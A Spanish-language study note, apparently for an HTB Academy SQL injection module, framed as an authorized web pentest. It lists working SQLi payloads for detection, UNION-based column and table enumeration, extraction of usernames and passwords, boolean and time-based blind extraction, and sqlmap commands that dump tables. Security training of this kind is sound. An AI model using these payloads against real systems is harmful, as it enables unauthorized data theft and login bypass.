---
title: "HTB Academy - SQL Injection Fundamentals"
category: web-security
difficulty: medium
tags: ["sql-injection", "web-security", "owasp", "htb-academy", "pentesting"]
date: 2026-02-17
status: ready
platform: HTB
---

# 🎓 HTB Academy - SQL Injection Fundamentals

## 🎭 Ataques de Inyección SQL

---

👨‍🏫 **Del Instructor**: Bienvenido al módulo de SQL Injection. Como Web Pentester, SQLi es una de las vulnerabilidades más críticas y comunes. Dominar esta técnica te permite acceder a datos sensibles, bypassear autenticación y potencialmente comprometer el servidor completo.

> 🎯 **Mentalidad de Hacker**: "Las bases de datos son las cajas fuertes de las aplicaciones web. SQL Injection es el arte de convencer a la aplicación de que tus consultas son legítimas, abriendo la caja fuerte sin llave."

---

## 🎭 El Escenario: Web Application Assessment

### Contexto del Pentest

Estás realizando un web application assessment para un cliente. Durante el reconnaissance, has identificado una aplicación web con formularios de login y búsqueda. Tu objetivo es detectar y explotar vulnerabilidades SQL Injection para:

- Acceder a datos sensibles de la base de datos
- Bypassear mecanismos de autenticación
- Demostrar el impacto de la vulnerabilidad

**Tu misión como Web Pentester**:
- Identificar puntos de inyección
- Determinar el tipo de base de datos
- Extraer información sensible
- Documentar la vulnerabilidad

## 🧠 Fundamentos de Análisis: SQL Injection

### ¿Qué es SQL Injection?

SQL Injection ocurre cuando input del usuario es concatenado directamente en una consulta SQL sin sanitización:

```sql
-- Consulta vulnerable
SELECT * FROM users WHERE username = '$input' AND password = '$password'

-- Input malicioso: ' OR '1'='1' --
-- Resultado:
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
```

### Tipos de SQL Injection

```
SQL Injection Types:
├── In-Band (Clásico)
│   ├── Error-based
│   └── Union-based
├── Blind
│   ├── Boolean-based
│   └── Time-based
└── Out-of-Band
    └── DNS/HTTP exfiltration
```

### OWASP Top 10

SQL Injection es #3 en OWASP Top 10 2021 (A03:2021 - Injection).

## 🔍 Metodología de Investigación

### Paso 1: Detección de Inyección

```bash
# Payloads de detección inicial
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
1' OR '1'='1
1 OR 1=1
1' AND '1'='1

# Observar respuestas:
# - Error SQL expuesto
# - Comportamiento diferente (true/false)
# - Tiempo de respuesta anómalo

# Usar comillas simples para romper sintaxis
# Si hay error SQL, es vulnerable
```

### Paso 2: Determinar Número de Columnas

```bash
# UNION injection - encontrar número de columnas
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# Continuar hasta error

# Alternativa con NULL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# MySQL ejemplo:
' UNION SELECT 1,2,3--
```

### Paso 3: Identificar Base de Datos

```bash
# MySQL
' UNION SELECT @@version,2,3--

# PostgreSQL
' UNION SELECT version(),2,3--

# SQL Server
' UNION SELECT @@version,2,3--

# Oracle
' UNION SELECT banner,NULL,NULL FROM v$version--

# SQLite
' UNION SELECT sqlite_version(),2,3--
```

### Paso 4: Extraer Información

```bash
# Listar bases de datos (MySQL)
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--

# Listar tablas
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--

# Listar columnas
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--

# Extraer datos
' UNION SELECT username,password,NULL FROM users--

# Concatenar múltiples columnas
' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--
```

### Paso 5: Blind SQL Injection

```bash
# Boolean-based blind
# True condition (muestra contenido normal)
' AND 1=1--
# False condition (no muestra contenido)
' AND 1=2--

# Extraer caracter a caracter
' AND SUBSTRING(database(),1,1)='a'--
' AND SUBSTRING(database(),1,1)='b'--
# Continuar hasta encontrar el caracter correcto

# Time-based blind
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

# Extraer con time-based
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
```

### Paso 6: Usar sqlmap (Automatizado)

```bash
# Instalar sqlmap
sudo apt install sqlmap

# Test básico
sqlmap -u "http://target.com/page?id=1" --batch

# Especificar parámetro
sqlmap -u "http://target.com/page?id=1" -p id --batch

# Enumerar bases de datos
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# Enumerar tablas
sqlmap -u "http://target.com/page?id=1" -D database_name --tables --batch

# Dump tabla
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump --batch

# POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=test" --batch
```

## 🛠️ Arsenal de Herramientas

| Herramienta | Uso | Comando |
|-------------|-----|---------|
| `sqlmap` | Automatización SQLi | `sqlmap -u URL --dbs` |
| `Burp Suite` | Interceptación manual | Proxy + Repeater |
| `SQLi Scanner` | Detección rápida | Extensions |
| `Manual` | Técnicas específicas | UNION, Blind |

## ✅ Checklist de Verificación

- [ ] Identificar puntos de entrada (forms, URLs)
- [ ] Testear payloads de detección
- [ ] Determinar tipo de SQLi
- [ ] Identificar DBMS
- [ ] Enumerar bases de datos
- [ ] Enumerar tablas y columnas
- [ ] Extraer datos sensibles
- [ ] Documentar con PoC

## 🎓 Lo Que Acabas de Aprender

**Habilidades Técnicas**:
- Detección manual de SQL Injection
- Técnicas UNION-based y Blind
- Uso de sqlmap para automatización
- Extracción de datos sensibles

**Mentalidad de Pentester**:
- **Paciencia metodológica**: Blind SQLi requiere iteración
- **Creatividad**: Cada app es diferente
- **Documentación**: Guardar todos los payloads exitosos

## 🚀 Próximos Pasos

1. **Advanced SQLi**: WAF bypass, second-order
2. **NoSQL Injection**: MongoDB, etc.
3. **OS Command Injection**: Desde SQLi a RCE
4. **Reporting**: Documentar vulnerabilidades

## 📚 Recursos HTB Academy

- [HTB Academy - SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [sqlmap Documentation](https://github.com/sqlmapproject/sqlmap)

---

## ✅ Estado

**LISTO PARA COMPLETAR** 🔵

- 📅 Fecha: 2026-02-17
- ⏱️ Tiempo estimado: 50 minutos
- 🎯 Dificultad: Media (HTB Academy Intermediate)